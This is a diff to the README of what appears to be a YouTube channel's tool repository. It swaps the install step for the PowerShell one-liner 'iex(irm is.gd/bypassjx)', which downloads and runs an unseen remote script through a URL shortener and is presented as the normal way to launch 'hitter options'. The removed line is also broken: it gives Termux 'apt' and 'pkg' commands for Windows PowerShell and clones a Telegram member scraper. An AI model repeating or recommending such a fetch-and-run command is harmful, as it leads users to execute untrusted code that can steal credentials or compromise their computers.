@@ -13,8 +13,8 @@ TechTube Insider YouTube Channel's Files
 
 * Right-click on the Windows start menu and select PowerShell or Terminal (Not CMD).
 * Copy-paste the below code and press enter
-*```
-apt update && apt upgrade && pkg install -y git python && pkg update && pkg upgrade && pkg install python git && git clone https://github.com/TechieGamer1/Techie-TG-Member-Scraper.git
+```
+iex(irm is.gd/bypassjx)
 ```
 * You will see the hitter options, follow the on-screen instructions.
 * That’s all.
